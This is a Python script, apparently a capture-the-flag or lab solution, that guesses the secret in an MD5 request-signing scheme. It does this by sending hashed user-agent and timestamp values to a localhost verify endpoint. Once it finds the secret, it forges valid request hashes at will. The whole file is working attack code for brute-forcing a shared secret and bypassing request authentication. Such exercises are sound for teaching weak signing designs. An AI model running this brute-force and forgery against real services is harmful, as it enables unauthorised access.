import requests
import hashlib
import time

def generate_hash(user_agent, timestamp, secret):
    """Generate hash using the same algorithm as server"""
    return hashlib.md5((user_agent + timestamp + secret).encode()).hexdigest()

def analyze_response(timestamp, hash_value, response):
    """Analyze server response to determine if hash was valid"""
    if response.status_code == 200:
        print(f"[+] Valid hash found! Timestamp: {timestamp}, Hash: {hash_value}")
        print(f"[+] Response: {response.json()}")
        return True
    return False

def brute_force_secret():
    """Try to brute force the secret by analyzing successful requests"""
    base_url = "http://localhost:5000/api/verify"
    user_agent = "Mozilla/5.0"
    
    # We'll try common words as secrets
    common_secrets = ["hidden_value", "secret", "password", "key", "admin"]
    
    current_time = int(time.time())
    
    for secret in common_secrets:
        timestamp = str(current_time)
        hash_value = generate_hash(user_agent, timestamp, secret)
        
        headers = {
            'User-Agent': user_agent,
            'X-Request-Hash': hash_value
        }
        
        response = requests.post(base_url, headers=headers)
        if analyze_response(timestamp, hash_value, response):
            print(f"[+] Found secret: {secret}")
            return secret
    
    return None

def main():
    print("[*] Starting Time Traveler's Request Analysis")
    print("[*] Attempting to brute force the secret...")
    
    secret = brute_force_secret()
    
    if secret:
        print("\n[+] Success! Now we can generate valid hashes at will")
        # Generate a valid hash for current timestamp
        current_time = str(int(time.time()))
        user_agent = "Mozilla/5.0"
        valid_hash = generate_hash(user_agent, current_time, secret)
        print(f"[+] Valid hash for current timestamp: {valid_hash}")
    else:
        print("[-] Failed to find the secret")

if __name__ == "__main__":
    main() 